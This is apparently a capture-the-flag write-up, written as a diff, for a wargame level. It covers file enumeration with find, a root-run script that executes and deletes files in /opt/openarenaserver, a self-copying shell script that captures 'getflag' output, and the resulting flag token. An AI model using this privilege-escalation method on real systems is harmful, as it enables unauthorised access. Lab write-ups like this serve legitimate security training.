@@ -1,0 +1,45 @@
+system analysis:
+
+it appears new files are made in >2016
+use this and group ownership as heuristic
+
+run:
+	$ find / -type f -newermt '2016-01-01' -group flag05 2>/dev/null
+	$ find / -type f -newermt '2016-01-01' -group level06 2>/dev/null
+
+	come across:
+		/usr/bin/openarenaserver
+
+	can not execute this file, try cat?
+		$ cat /usr/bin/openarenaserver
+		#!/bin/sh
+
+		for i in /opt/openarenaserver/* ; do
+			(ulimit -t 5; bash -x "$i")
+			rm -f "$i"
+		done
+
+	-> Scripts in this directory are executed and deleted..
+
+	so.. make a persistent script that prints getflag?
+
+source:
+if [ -f "/opt/openarenaserver/test1.sh" ]; then
+	cat /opt/openarenaserver/test1.sh > /opt/openarenaserver/test.sh
+fi
+if [ -f "/opt/openarenaserver/test.sh" ]; then
+	cat /opt/openarenaserver/test.sh > /opt/openarenaserver/test1.sh
+fi
+
+echo -n "#" >> /opt/openarenaserver/test.sh
+echo -n "#" >> /opt/openarenaserver/test1.sh
+
+getflag >> /opt/openarenaserver/test.sh
+getflag >> /opt/openarenaserver/test1.sh
+
+spam ls until test1.sh appears
+
+run cat test1.sh
+token is inside comment at end of file
+
+viuaaale9huek52boumoomioc
